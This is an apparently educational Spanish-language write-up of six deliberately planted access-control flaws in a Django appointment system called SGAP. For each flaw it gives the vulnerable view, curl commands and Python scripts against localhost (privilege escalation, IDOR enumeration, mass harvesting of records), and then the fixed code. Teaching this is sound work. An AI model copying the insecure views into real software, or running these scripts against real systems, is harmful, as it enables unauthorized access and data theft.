# Vulnerabilidades de Broken Access Control - SGAP

Este documento describe las vulnerabilidades de **Broken Access Control** implementadas en el sistema SGAP con fines educativos y de demostración.

## ⚠️ ADVERTENCIA
Estas vulnerabilidades son **INTENCIONALES** y están diseñadas únicamente para fines educativos. **NUNCA** debes implementar código similar en un entorno de producción.

---

## 📋 Índice de Vulnerabilidades

1. [Eliminación de citas sin autorización](#1-eliminación-de-citas-sin-autorización)
2. [Acceso a datos de otros usuarios](#2-acceso-a-datos-de-otros-usuarios)
3. [Elevación de privilegios](#3-elevación-de-privilegios)
4. [Exposición de información sensible](#4-exposición-de-información-sensible)
5. [Modificación de estado sin permisos](#5-modificación-de-estado-sin-permisos)
6. [IDOR - Insecure Direct Object Reference](#6-idor---insecure-direct-object-reference)

---

## 1. Eliminación de Citas sin Autorización

### Descripción
La función `eliminar_cita()` permite a cualquier usuario autenticado eliminar cualquier cita del sistema, independientemente de si es el propietario o tiene permisos de administrador.

### Ubicación
- **Archivo:** `paginas/views.py`
- **Función:** `eliminar_cita(request, id_cita)`
- **Endpoint:** `/eliminar_cita/<id_cita>/`

### Código Vulnerable
```python
def eliminar_cita(request, id_cita):
    cita = get_object_or_404(Cita, pk=id_cita)
    cita.delete()  # ❌ No verifica permisos
    return redirect('citas')
```

### Explotación
```bash
# Como usuario normal, eliminar cualquier cita
curl -X GET "http://localhost:8000/eliminar_cita/5/" \
  -H "Cookie: sessionid=YOUR_SESSION_ID"

# O simplemente visitar en el navegador:
http://localhost:8000/eliminar_cita/1/
http://localhost:8000/eliminar_cita/2/
http://localhost:8000/eliminar_cita/3/
```

### Impacto
- **Severidad:** ALTA
- Un usuario malicioso puede eliminar todas las citas del sistema
- Pérdida de datos importantes
- Denegación de servicio

### Solución Correcta
```python
def eliminar_cita(request, id_cita):
    cita = get_object_or_404(Cita, pk=id_cita)
    
    # ✅ Verificar que el usuario sea staff o dueño de la cita
    if not request.user.is_staff and cita.user != request.user:
        return HttpResponseForbidden("No tienes permisos para eliminar esta cita")
    
    cita.delete()
    return redirect('citas')
```

---

## 2. Acceso a Datos de Otros Usuarios

### Descripción
La función `ver_citas_usuario()` acepta un parámetro `user_id` en la URL sin validar que corresponda al usuario actual, permitiendo ver las citas de cualquier usuario.

### Ubicación
- **Archivo:** `paginas/views.py`
- **Función:** `ver_citas_usuario(request)`
- **Endpoint:** `/ver_citas_usuario/?user_id=<id>`

### Código Vulnerable
```python
def ver_citas_usuario(request):
    user_id = request.GET.get('user_id', request.user.id)  # ❌ Acepta cualquier ID
    citas = Cita.objects.filter(user_id=user_id).order_by('-fecha')
    return render(request, 'citas.html', {'citas': citas})
```

### Explotación
```bash
# Ver citas del usuario con ID 1
curl "http://localhost:8000/ver_citas_usuario/?user_id=1" \
  -H "Cookie: sessionid=YOUR_SESSION_ID"

# Ver citas del usuario con ID 2
curl "http://localhost:8000/ver_citas_usuario/?user_id=2" \
  -H "Cookie: sessionid=YOUR_SESSION_ID"

# Iterar sobre todos los usuarios
for i in {1..100}; do
  curl "http://localhost:8000/ver_citas_usuario/?user_id=$i"
done
```

### Impacto
- **Severidad:** ALTA
- Violación de privacidad
- Acceso no autorizado a información confidencial
- Exposición de datos personales de otros usuarios

### Solución Correcta
```python
def ver_citas_usuario(request):
    # ✅ Solo permitir ver las propias citas o todas si es staff
    if request.user.is_staff:
        user_id = request.GET.get('user_id', request.user.id)
    else:
        user_id = request.user.id  # Forzar a usar el ID del usuario actual
    
    citas = Cita.objects.filter(user_id=user_id).order_by('-fecha')
    return render(request, 'citas.html', {'citas': citas})
```

---

## 3. Elevación de Privilegios

### Descripción
El endpoint `cambiar_rol()` permite a cualquier usuario cambiar el rol de cualquier cuenta, incluyendo convertirse en administrador.

### Ubicación
- **Archivo:** `paginas/views.py`
- **Función:** `cambiar_rol(request)`
- **Endpoint:** `/cambiar_rol/?user_id=<id>&is_staff=<true|false>`

### Código Vulnerable
```python
def cambiar_rol(request):
    user_id = request.GET.get('user_id')
    is_staff = request.GET.get('is_staff', 'false').lower() == 'true'
    
    usuario = User.objects.get(id=user_id)
    usuario.is_staff = is_staff  # ❌ No valida permisos
    usuario.save()
    return JsonResponse({'status': 'success'})
```

### Explotación
```bash
# Convertirse en administrador
curl "http://localhost:8000/cambiar_rol/?user_id=3&is_staff=true" \
  -H "Cookie: sessionid=YOUR_SESSION_ID"

# Respuesta:
{
  "status": "success",
  "message": "Usuario john ahora es administrador",
  "user": "john",
  "is_staff": true
}

# Ahora puedes acceder a funciones administrativas
curl "http://localhost:8000/citas_pendientes/" \
  -H "Cookie: sessionid=YOUR_SESSION_ID"
```

### Script de Ataque
```python
import requests

session = requests.Session()

# 1. Iniciar sesión como usuario normal
session.post('http://localhost:8000/', data={
    'username': 'usuario_normal',
    'password': 'password123'
})

# 2. Obtener tu user_id
response = session.get('http://localhost:8000/listar_usuarios/')
users = response.json()['usuarios']
my_user = next(u for u in users if u['username'] == 'usuario_normal')

# 3. Elevarse a administrador
session.get(f"http://localhost:8000/cambiar_rol/?user_id={my_user['id']}&is_staff=true")

print("¡Ahora eres administrador!")
```

### Impacto
- **Severidad:** CRÍTICA
- Compromiso total del sistema
- Cualquier usuario puede obtener privilegios de administrador
- Acceso completo a todas las funcionalidades

### Solución Correcta
```python
@require_http_methods(["POST"])
@user_passes_test(lambda u: u.is_superuser)
def cambiar_rol(request):
    # ✅ Solo superusuarios pueden cambiar roles
    # ✅ Usar POST en lugar de GET
    user_id = request.POST.get('user_id')
    is_staff = request.POST.get('is_staff') == 'true'
    
    usuario = User.objects.get(id=user_id)
    usuario.is_staff = is_staff
    usuario.save()
    return JsonResponse({'status': 'success'})
```

---

## 4. Exposición de Información Sensible

### Descripción
El endpoint `listar_usuarios()` devuelve información detallada de todos los usuarios del sistema sin ninguna validación de permisos.

### Ubicación
- **Archivo:** `paginas/views.py`
- **Función:** `listar_usuarios(request)`
- **Endpoint:** `/listar_usuarios/`

### Código Vulnerable
```python
def listar_usuarios(request):
    # ❌ No verifica permisos
    usuarios = User.objects.all().values(
        'id', 'username', 'email', 'is_staff', 'is_superuser'
    )
    return JsonResponse({'usuarios': list(usuarios)})
```

### Explotación
```bash
# Obtener todos los usuarios del sistema
curl "http://localhost:8000/listar_usuarios/" \
  -H "Cookie: sessionid=YOUR_SESSION_ID"

# Respuesta incluye información sensible:
{
  "usuarios": [
    {
      "id": 1,
      "username": "admin",
      "email": "admin@ejemplo.com",
      "is_staff": true,
      "is_superuser": true,
      "citas": [
        {
          "matricula": "12345678",
          "nombre": "Juan",
          "apellido_paterno": "Pérez",
          "sexo": "Hombre",
          "carrera": "Ingenieria en Software",
          "descripcion": "Información confidencial..."
        }
      ]
    },
    ...
  ],
  "total": 50
}
```

### Impacto
- **Severidad:** ALTA
- Exposición masiva de datos personales
- Información sobre estructura organizacional
- Lista de correos para phishing
- Identificación de cuentas de administrador

### Solución Correcta
```python
@login_required
def listar_usuarios(request):
    # ✅ Solo administradores pueden ver la lista
    if not request.user.is_staff:
        return HttpResponseForbidden("No tienes permisos")
    
    usuarios = User.objects.all().values('id', 'username', 'email')
    return JsonResponse({'usuarios': list(usuarios)})
```

---

## 5. Modificación de Estado sin Permisos

### Descripción
La función `modificar_estado_cita()` permite a cualquier usuario cambiar el estado de cualquier cita, una acción que debería ser exclusiva de orientadores.

### Ubicación
- **Archivo:** `paginas/views.py`
- **Función:** `modificar_estado_cita(request, id_cita)`
- **Endpoint:** `/modificar_estado_cita/<id_cita>/`

### Código Vulnerable
```python
def modificar_estado_cita(request, id_cita):
    nuevo_estado = request.POST.get('estado')
    cita = get_object_or_404(Cita, pk=id_cita)
    cita.estado = nuevo_estado  # ❌ No valida permisos
    cita.save()
    return JsonResponse({'status': 'success'})
```

### Explotación
```bash
# Confirmar tu propia cita sin aprobación del orientador
curl -X POST "http://localhost:8000/modificar_estado_cita/5/" \
  -d "estado=Confirmada" \
  -H "Cookie: sessionid=YOUR_SESSION_ID"

# Declinar citas de otros usuarios
curl -X POST "http://localhost:8000/modificar_estado_cita/10/" \
  -d "estado=Declinada" \
  -H "Cookie: sessionid=YOUR_SESSION_ID"
```

### Script de Ataque
```python
import requests

session = requests.Session()
session.post('http://localhost:8000/', data={
    'username': 'usuario',
    'password': 'pass'
})

# Auto-aprobar todas tus citas pendientes
citas = session.get('http://localhost:8000/ver_citas_usuario/').json()
for cita in citas:
    if cita['estado'] == 'Pendiente':
        session.post(
            f"http://localhost:8000/modificar_estado_cita/{cita['id']}/",
            data={'estado': 'Confirmada'}
        )
        print(f"Cita {cita['id']} auto-aprobada")
```

### Impacto
- **Severidad:** MEDIA-ALTA
- Bypass del proceso de aprobación
- Usuarios pueden auto-aprobar sus citas
- Sabotaje de citas de otros usuarios
- Alteración de registros

### Solución Correcta
```python
@login_required
@require_POST
def modificar_estado_cita(request, id_cita):
    # ✅ Solo staff puede cambiar estados
    if not request.user.is_staff:
        return JsonResponse({'status': 'error', 'message': 'No autorizado'}, status=403)
    
    nuevo_estado = request.POST.get('estado')
    cita = get_object_or_404(Cita, pk=id_cita)
    
    if nuevo_estado in ['Pendiente', 'Confirmada', 'Declinada']:
        cita.estado = nuevo_estado
        cita.save()
        return JsonResponse({'status': 'success'})
    
    return JsonResponse({'status': 'error', 'message': 'Estado inválido'})
```

---

## 6. IDOR - Insecure Direct Object Reference

### Descripción
La función `obtener_datos_cita()` devuelve todos los datos de una cita basándose únicamente en el ID proporcionado, sin verificar que el usuario tenga derecho a acceder a esa información.

### Ubicación
- **Archivo:** `paginas/views.py`
- **Función:** `obtener_datos_cita(request, id_cita)`
- **Endpoint:** `/obtener_datos_cita/<id_cita>/`

### Código Vulnerable
```python
def obtener_datos_cita(request, id_cita):
    cita = get_object_or_404(Cita, pk=id_cita)  # ❌ No verifica propiedad
    
    datos = {
        'id': cita.id,
        'matricula': cita.matricula,
        'descripcion': cita.descripcion,
        'comentarios_orientador': cita.comentarios_orientador,
        'usuario_email': cita.user.email,
    }
    return JsonResponse(datos)
```

### Explotación
```bash
# Enumerar todas las citas del sistema
for i in {1..100}; do
  curl "http://localhost:8000/obtener_datos_cita/$i/" \
    -H "Cookie: sessionid=YOUR_SESSION_ID" \
    >> citas_robadas.json
done

# Ver datos específicos de una cita
curl "http://localhost:8000/obtener_datos_cita/15/" \
  -H "Cookie: sessionid=YOUR_SESSION_ID"
```

### Script de Recolección Masiva
```python
import requests
import json

session = requests.Session()
session.post('http://localhost:8000/', data={
    'username': 'atacante',
    'password': 'password'
})

# Recolectar datos de todas las citas
datos_robados = []
for cita_id in range(1, 1000):
    try:
        response = session.get(f'http://localhost:8000/obtener_datos_cita/{cita_id}/')
        if response.status_code == 200:
            datos_robados.append(response.json())
            print(f"✓ Cita {cita_id} obtenida")
    except:
        pass

# Guardar en archivo
with open('datos_sensibles.json', 'w') as f:
    json.dump(datos_robados, f, indent=2)

print(f"Total de citas robadas: {len(datos_robados)}")
```

### Impacto
- **Severidad:** ALTA
- Acceso no autorizado a información confidencial
- Exposición de datos personales (matrícula, email, comentarios)
- Enumeración completa de recursos
- Violación de privacidad

### Solución Correcta
```python
@login_required
def obtener_datos_cita(request, id_cita):
    cita = get_object_or_404(Cita, pk=id_cita)
    
    # ✅ Verificar que el usuario sea dueño o staff
    if cita.user != request.user and not request.user.is_staff:
        return JsonResponse(
            {'error': 'No tienes permisos para ver esta cita'}, 
            status=403
        )
    
    datos = {
        'id': cita.id,
        'descripcion': cita.descripcion,
        'fecha': cita.fecha.strftime('%Y-%m-%d %H:%M'),
        'estado': cita.estado,
    }
    return JsonResponse(datos)
```

---

## 🛡️ Principios de Control de Acceso Seguro

Para prevenir estas vulnerabilidades, sigue estos principios:

### 1. Principio de Privilegio Mínimo
```python
# ✅ BUENO: Solo dar los permisos necesarios
@login_required
@user_passes_test(lambda u: u.is_staff)
def vista_administrativa(request):
    pass
```

### 2. Validar Propiedad de Recursos
```python
# ✅ BUENO: Verificar que el usuario sea dueño
def editar_cita(request, id_cita):
    cita = get_object_or_404(Cita, pk=id_cita)
    if cita.user != request.user and not request.user.is_staff:
        return HttpResponseForbidden()
```

### 3. Usar Decoradores de Django
```python
from django.contrib.auth.decorators import login_required, permission_required

# ✅ BUENO: Usar decoradores integrados
@login_required
@permission_required('paginas.delete_cita')
def eliminar_cita(request, id_cita):
    pass
```

### 4. Validar en el Backend
```python
# ❌ MALO: Confiar en validaciones del frontend
# ✅ BUENO: Siempre validar en el servidor
def cambiar_estado(request):
    if not request.user.is_staff:
        return HttpResponseForbidden()
    # ... resto del código
```

### 5. Filtrar Queries por Usuario
```python
# ✅ BUENO: Filtrar automáticamente por usuario
def mis_citas(request):
    if request.user.is_staff:
        citas = Cita.objects.all()
    else:
        citas = Cita.objects.filter(user=request.user)
```

---

## 🧪 Pruebas de Seguridad

### Checklist de Validación

Para cada endpoint, verifica:

- [ ] ¿Requiere autenticación? (`@login_required`)
- [ ] ¿Valida roles/permisos? (`@user_passes_test`, `@permission_required`)
- [ ] ¿Verifica propiedad del recurso?
- [ ] ¿Usa el ID del usuario autenticado en lugar de parámetros?
- [ ] ¿Usa POST para acciones destructivas?
- [ ] ¿Incluye tokens CSRF?
- [ ] ¿Registra acciones sensibles en logs?

### Herramientas de Testing

```bash
# Burp Suite - Interceptar y modificar requests
# OWASP ZAP - Escaneo automatizado
# Postman - Testing manual de APIs

# Ejemplo con curl:
curl -v -X POST "http://localhost:8000/eliminar_cita/1/" \
  -H "Cookie: sessionid=OTRA_SESSION" \
  -H "X-CSRFToken: token"
```

---

## 📚 Referencias

- [OWASP Top 10 - A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [Django Security](https://docs.djangoproject.com/en/stable/topics/security/)
- [OWASP Testing Guide - Authorization Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/README)

---

## ⚠️ RECORDATORIO FINAL

Este código vulnerable es **SOLO PARA EDUCACIÓN**. En un proyecto real:

1. ✅ Usa siempre `@login_required`
2. ✅ Valida permisos en cada vista
3. ✅ Verifica propiedad de recursos
4. ✅ No confíes en datos del cliente
5. ✅ Implementa logging de acciones sensibles
6. ✅ Realiza auditorías de seguridad regulares
7. ✅ Usa Django's permission system
8. ✅ Implementa rate limiting
9. ✅ Mantén Django actualizado
10. ✅ Prueba con diferentes roles de usuario

**La seguridad no es opcional, es fundamental.**
